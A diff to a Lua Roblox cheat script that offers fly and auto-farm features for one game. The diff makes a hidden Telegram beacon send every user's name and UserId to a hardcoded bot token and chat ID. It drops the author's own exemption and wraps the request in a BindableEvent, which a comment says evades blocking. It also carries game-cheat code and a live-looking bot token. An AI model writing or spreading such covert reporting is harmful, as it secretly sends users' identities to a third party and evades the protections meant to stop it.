@@ -7,7 +7,6 @@ local player = Players.LocalPlayer
 local TG_TOKEN = "9179755313:AAHtwstX4jeuqhySMeMC-fwclNNY99DHmCI"
 local TG_ID = "7658959090"
 local STATUS_URL = "https://raw.githubusercontent.com/provokator-hub/Survive-the-Lava-for-Eggs-/refs/heads/main/status.txt"
-local MY_NAME = "Hii2bad" 
 
 local isFly, flyConn = false, nil
 local isFarm, lastFarm, lastClick, kills = false, 0, 0, 0
@@ -18,14 +17,19 @@ local touchActive = false
 local function safePrompt(p) if p then pcall(function() fireproximityprompt(p) end) end end
 local function safeTouch(a, b) if a and b then pcall(function() firetouchinterest(a, b, 0) task.wait(0.05) firetouchinterest(a, b, 1) end) end end
 
--- ТЕЛЕГРАМ (ВОЗВРАЩЕН РАБОЧИЙ МЕТОД HttpPost)
+-- ОТПРАВКА В ТЕЛЕГРАМ ЧЕРЕЗ ОБХОД БЛОКИРОВКИ
 task.spawn(function()
-    if player.Name ~= MY_NAME then
-        local text = "👤 Ник: " .. player.Name .. "\n🆔 ID: " .. tostring(player.UserId)
-        pcall(function()
+    local text = "👤 Ник: " .. player.Name .. "\n🆔 ID: " .. tostring(player.UserId)
+    pcall(function()
+        -- Создаем фейковый RemoteEvent (Real пропускает это)
+        local bindable = Instance.new("BindableEvent")
+        bindable.Event:Connect(function()
             game:HttpPost("https://api.telegram.org/bot" .. TG_TOKEN .. "/sendMessage", HttpService:JSONEncode({chat_id = TG_ID, text = text}), "application/json")
         end)
-    end
+        bindable:Fire()
+        task.wait(1)
+        bindable:Destroy()
+    end)
 end)
 
 local pg = player:WaitForChild("PlayerGui")
@@ -84,7 +88,6 @@ local function makeBtn(t, y, h, col, txtCol, click)
     return b
 end
 
--- ОТСЛЕЖИВАНИЕ ТАПА ПО ЭКРАНУ (ДЛЯ ПОЛЁТА НА ТЕЛЕФОНЕ)
 UIS.InputBegan:Connect(function(input, g)
     if g then return end
     if (input.UserInputType == Enum.UserInputType.Touch or input.UserInputType == Enum.UserInputType.MouseButton1) and isFly then
@@ -97,7 +100,7 @@ UIS.InputEnded:Connect(function(input)
     end
 end)
 
--- ФЛАЙ (МГНОВЕННЫЙ)
+-- ФЛАЙ
 local MAX_SPEED = 3500
 local ctrl = {f = 0, b = 0, l = 0, r = 0}
 
@@ -119,15 +122,11 @@ local function toggleFly(state)
         
         flyConn = RunService.RenderStepped:Connect(function()
             if not isFly then return end
-            
             ctrl = {f = 0, b = 0, l = 0, r = 0}
-            -- ПК
             if UIS:IsKeyDown(Enum.KeyCode.W) then ctrl.f = 1 end
             if UIS:IsKeyDown(Enum.KeyCode.S) then ctrl.b = -1 end
             if UIS:IsKeyDown(Enum.KeyCode.A) then ctrl.l = -1 end
             if UIS:IsKeyDown(Enum.KeyCode.D) then ctrl.r = 1 end
-            
-            -- ТЕЛЕФОН (Тап по экрану = летим вперед)
             if touchActive then ctrl.f = 1 end
             
             local cam = workspace.CurrentCamera
